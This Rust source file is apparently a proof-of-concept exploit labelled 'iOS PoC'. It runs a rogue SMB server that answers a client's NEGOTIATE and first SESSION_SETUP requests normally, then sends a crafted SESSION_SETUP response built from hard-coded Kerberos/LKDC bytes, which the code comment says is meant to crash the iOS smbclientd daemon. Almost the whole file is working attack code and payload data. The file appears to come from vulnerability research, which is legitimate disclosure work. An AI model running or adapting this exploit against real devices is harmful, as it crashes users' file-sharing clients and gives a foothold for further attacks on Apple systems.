use crate::common::{recv_smb_req, send_smb_res};
use std::net::TcpListener;

/// iOS PoC
pub fn run(listener: TcpListener) {
    let mut buffer = [0; 4096];

    // Accept the 1st connection, which is used to perform all the work.
    let (mut stream, addr) = listener.accept().unwrap();
    println!("connection #1: {addr}");

    // The SMB client sends a 1st NEGOTIATE request with SMB v2.
    recv_smb_req(&mut stream, &mut buffer);
    send_smb_res(&mut stream, RESPONSE_1, false);

    // The SMB client sends a 1st SESSION_SETUP request.
    // We respond as the real smbd server would.
    recv_smb_req(&mut stream, &mut buffer);
    send_smb_res(&mut stream, RESPONSE_2, false);

    // The SMB client sends a 2nd SESSION_SETUP request.
    // We respond with the malicious payload to trigger a smbclientd crash.
    recv_smb_req(&mut stream, &mut buffer);
    send_smb_res(&mut stream, RESPONSE_3, true);
}

const RESPONSE_1: &[u8] = b"\
\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x41\x00\x03\x00\x02\x03\x00\x00\x5a\x8a\x47\x0f\xd2\x5a\x5a\x1e\
\xba\xa3\x1e\x3e\x54\x2c\xe5\x38\x66\x00\x00\x00\x00\x00\x40\x00\
\x00\x00\x40\x00\x00\x00\x40\x00\x52\x99\xb3\x55\x50\x17\xd8\x01\
\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x80\x00\x00\x00\x00\x00\
\x60\x7e\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x74\x30\x72\xa0\x44\
\x30\x42\x06\x09\x2a\x86\x48\x82\xf7\x12\x01\x02\x02\x06\x09\x2a\
\x86\x48\x86\xf7\x12\x01\x02\x02\x06\x06\x2a\x85\x70\x2b\x0e\x03\
\x06\x06\x2b\x06\x01\x05\x05\x0e\x06\x0a\x2b\x06\x01\x04\x01\x82\
\x37\x02\x02\x0a\x06\x06\x2b\x05\x01\x05\x02\x07\x06\x06\x2b\x06\
\x01\x05\x02\x05\xa3\x2a\x30\x28\xa0\x26\x1b\x24\x6e\x6f\x74\x5f\
\x64\x65\x66\x69\x6e\x65\x64\x5f\x69\x6e\x5f\x52\x46\x43\x34\x31\
\x37\x38\x40\x70\x6c\x65\x61\x73\x65\x5f\x69\x67\x6e\x6f\x72\x65";

const RESPONSE_2: &[u8] = b"\
\xfe\x53\x4d\x42\x40\x00\x01\x00\x16\x00\x00\xc0\x01\x00\x00\x01\
\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\
\xff\xfe\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xfd\x1c\xbb\x19\
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x09\x00\x00\x00\x48\x00\x3e\x01\xa1\x82\x01\x3a\x30\x82\x01\x36\
\xa0\x03\x0a\x01\x01\xa1\x08\x06\x06\x2b\x06\x01\x05\x02\x05\xa2\
\x82\x01\x23\x04\x82\x01\x1f\x60\x82\x01\x1b\x06\x06\x2b\x06\x01\
\x05\x02\x05\x05\x01\x30\x1c\xa1\x1a\x0c\x18\x57\x45\x4c\x4c\x4b\
\x4e\x4f\x57\x4e\x3a\x43\x4f\x4d\x2e\x41\x50\x50\x4c\x45\x2e\x4c\
\x4b\x44\x43\x7e\x81\xf0\x30\x81\xed\xa0\x03\x02\x01\x05\xa1\x03\
\x02\x01\x1e\xa4\x11\x18\x0f\x32\x30\x32\x32\x30\x32\x30\x31\x30\
\x39\x34\x37\x34\x39\x5a\xa5\x05\x02\x03\x0c\x37\x2d\xa6\x03\x02\
\x01\x44\xa7\x34\x1b\x32\x4c\x4b\x44\x43\x3a\x53\x48\x41\x31\x2e\
\x41\x30\x31\x46\x35\x43\x44\x30\x32\x30\x36\x32\x43\x42\x32\x33\
\x31\x44\x43\x36\x36\x45\x37\x32\x33\x37\x31\x37\x38\x36\x41\x30\
\x45\x30\x41\x44\x30\x33\x38\x37\xa8\x14\x30\x12\xa0\x03\x02\x01\
\x01\xa1\x0b\x30\x09\x1b\x07\x45\x6c\x47\x75\x65\x73\x74\xa9\x1a\
\x1b\x18\x57\x45\x4c\x4c\x4b\x4e\x4f\x57\x4e\x3a\x43\x4f\x4d\x2e\
\x41\x50\x50\x4c\x45\x2e\x4c\x4b\x44\x43\xaa\x2d\x30\x2b\xa0\x03\
\x02\x01\x02\xa1\x24\x30\x22\x1b\x06\x6b\x72\x62\x74\x67\x74\x1b\
\x18\x57\x45\x4c\x4c\x4b\x4e\x4f\x57\x4e\x3a\x43\x4f\x4d\x2e\x41\
\x50\x50\x4c\x45\x2e\x4c\x4b\x44\x43\xab\x2b\x1b\x29\x4c\x4b\x44\
\x43\x20\x72\x65\x66\x65\x72\x72\x61\x6c\x20\x74\x6f\x20\x74\x68\
\x65\x20\x72\x65\x61\x6c\x20\x4c\x4b\x44\x43\x20\x72\x65\x61\x6c\
\x6d\x20\x6e\x61\x6d\x65";

const RESPONSE_3: &[u8] = b"\
\xfe\x53\x4d\x42\x40\x00\x01\x00\x16\x00\x00\xc0\x01\x00\x00\x01\
\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\
\xff\xfe\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xfd\x1c\xbb\x19\
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x09\x00\x00\x00\x48\x00\x4b\x03\xa1\x82\x03\x47\x30\x82\x03\x43\
\xa0\x03\x0a\x01\x01\xa2\x82\x03\x3a\x04\x82\x03\x36\x60\x82\x03\
\x32\x06\x06\x2b\x06\x01\x05\x02\x05\x05\x01\x30\x36\xa1\x34\x0c\
\x32\x4c\x4b\x44\x43\x3a\x53\x48\x41\x31\x2e\x41\x30\x31\x46\x35\
\x43\x44\x30\x32\x30\x36\x32\x43\x42\x32\x33\x31\x44\x43\x36\x36\
\x45\x37\x32\x33\x37\x31\x37\x38\x36\x41\x30\x45\x30\x41\x44\x30\
\x33\x38\x37\x7e\x82\x02\xec\x30\x82\x02\xe8\xa0\x03\x02\x01\x05\
\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f\x32\x30\x32\x32\x30\x32\x30\
\x31\x30\x39\x34\x37\x34\x39\x5a\xa5\x05\x02\x03\x0c\xd1\xab\xa6\
\x03\x02\x01\x19\xa7\x34\x1b\x32\x4c\x4b\x44\x43\x3a\x53\x48\x41\
\x31\x2e\x41\x30\x31\x46\x35\x43\x44\x30\x32\x30\x36\x32\x43\x42\
\x32\x33\x31\x44\x43\x36\x36\x45\x37\x32\x33\x37\x31\x37\x38\x36\
\x41\x30\x45\x30\x41\x44\x30\x33\x38\x37\xa8\x14\x30\x12\xa0\x03\
\x02\x01\x01\xa1\x0b\x30\x09\x1b\x07\x45\x6c\x47\x75\x65\x73\x74\
\xa9\x34\x1b\x32\x4c\x4b\x44\x43\x3a\x53\x48\x41\x31\x2e\x41\x30\
\x31\x46\x35\x43\x44\x30\x32\x30\x36\x32\x43\x42\x32\x33\x31\x44\
\x43\x36\x36\x45\x37\x32\x33\x37\x31\x37\x38\x36\x41\x30\x45\x30\
\x41\x44\x30\x33\x38\x37\xaa\x47\x30\x45\xa0\x03\x02\x01\x02\xa1\
\x3e\x30\x3c\x1b\x06\x6b\x72\x62\x74\x67\x74\x1b\x32\x4c\x4b\x44\
\x43\x3a\x53\x48\x41\x31\x2e\x41\x30\x31\x46\x35\x43\x44\x30\x32\
\x30\x36\x32\x43\x42\x32\x33\x31\x44\x43\x36\x36\x45\x37\x32\x33\
\x37\x31\x37\x38\x36\x41\x30\x45\x30\x41\x44\x30\x33\x38\x37\xab\
\x2b\x1b\x29\x4e\x65\x65\x64\x20\x74\x6f\x20\x75\x73\x65\x20\x50\
\x41\x2d\x45\x4e\x43\x2d\x54\x49\x4d\x45\x53\x54\x41\x4d\x50\x2f\
\x50\x41\x2d\x50\x4b\x2d\x41\x53\x2d\x52\x45\x51\xac\x82\x01\xc3\
\x04\x82\x01\xbf\x30\x82\x01\xbb\x30\x09\xa1\x03\x02\x01\x10\xa2\
\x02\x04\x00\x30\x09\xa1\x03\x02\x01\x0f\xa2\x02\x04\x00\x30\x0a\
\xa1\x04\x02\x02\x00\x93\xa2\x02\x04\x00\x30\x09\xa1\x03\x02\x01\
\x02\xa2\x02\x04\x00\x30\x3e\xa1\x04\x02\x02\x00\xfa\xa2\x36\x04\
\x34\x30\x32\xa0\x23\x31\x21\x30\x1f\xa0\x03\x02\x01\x01\xa1\x12\
\x04\x10\xb4\x6a\xfe\xa7\xaa\x7a\xbb\xe6\xe0\xde\x16\x0c\xf8\x86\
\xef\xa5\xa2\x04\x02\x02\x0f\xa0\xa1\x0b\x30\x09\xa0\x03\x02\x01\
\x00\xa1\x02\x04\x00\x30\x0a\xa1\x04\x02\x02\x00\x88\xa2\x02\x04\
\x00\x30\x57\xa1\x03\x02\x01\x13\xa2\x50\x04\x4e\x30\x4c\x30\x4a\
\xa0\x03\x02\x01\x12\xa1\x3b\x1b\x39\x4c\x4b\x44\x43\x3a\x53\x48\
\x41\x31\x2e\x41\x30\x31\x46\x35\x43\x44\x30\x32\x30\x36\x32\x43\
\x42\x32\x33\x31\x44\x43\x36\x36\x45\x37\x32\x33\x37\x31\x37\x38\
\x36\x41\x30\x45\x30\x41\x44\x30\x33\x38\x37\x65\x6c\x67\x75\x65\
\x73\x74\xa2\x06\x04\x04\x00\x00\x10\x00\x30\x81\xe6\xa1\x04\x02\
\x02\x00\x85\xa2\x81\xdd\x04\x81\xda\x30\x81\xd7\xa0\x03\x02\x01\
\x02\xa1\x34\x0c\x32\x4c\x4b\x44\x43\x3a\x53\x48\x41\x31\x2e\x41\
\x30\x31\x46\x35\x43\x44\x30\x32\x30\x36\x32\x43\x42\x32\x33\x31\
\x44\x43\x36\x36\x45\x37\x32\x33\x37\x31\x37\x38\x36\x41\x30\x45\
\x30\x41\x44\x30\x33\x38\x37\xa2\x81\x99\x30\x81\x96\xa0\x03\x02\
\x01\x12\xa2\x81\x8e\x04\x81\x8b\x80\x87\x4d\x84\xb1\xd5\x14\x55\
\x98\xa7\x3a\xbc\xc4\x5f\x4f\xde\x48\x27\x2d\x68\x6c\x09\x36\xc1\
\xeb\x98\xdd\xa2\x37\xea\x86\x70\x8f\xf9\x4f\xee\x74\x6e\xfc\x90\
\xcc\x36\x90\x20\xdf\xb1\x67\x53\x9a\xb0\x15\x16\x0f\x95\x70\xaf\
\x4f\x93\x19\xd8\xeb\xea\x3f\xa0\xbb\xb9\x1f\xf8\x17\x09\xd8\x15\
\xf9\x9a\xcb\xdb\x4b\xb6\xa2\x62\x20\xbd\xa2\x36\xef\x9f\x0d\x75\
\x2f\x65\xcc\x47\xd6\xcd\x82\xe5\x9c\xcf\x1d\xfa\x01\x30\xbf\x0a\
\x42\xe0\x42\xca\x2c\x1a\xf0\x87\xbf\x85\x1f\xac\x3a\xcf\x5e\x4f\
\x05\x22\x57\xe1\xae\xb1\x97\x93\xd6\xa3\x3e\xd1\xc4\xa6\xad\xb8\
\x41\x70\x23";
